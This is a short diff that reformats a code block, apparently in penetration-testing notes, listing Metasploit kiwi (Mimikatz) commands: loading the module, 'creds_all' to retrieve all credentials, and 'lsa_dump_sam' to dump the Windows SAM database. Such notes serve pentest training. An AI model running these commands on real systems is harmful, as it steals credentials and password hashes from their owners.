@@ -13,9 +13,7 @@
 
 
 
-{% code title="Metasploit module" %}
-```bash
-# load the kiwi module
+<pre class="language-bash" data-title="Metasploit module"><code class="lang-bash"># load the kiwi module
 load kiwi
 
 # get help menu
@@ -24,10 +22,9 @@ load kiwi
 # retrieve all credentials with kiwi
 creds_all
 
-# dump from SAM db
-lsa_dump_sam
-```
-{% endcode %}
+<strong># dump from SAM db
+</strong>lsa_dump_sam
+</code></pre>
 
 
 
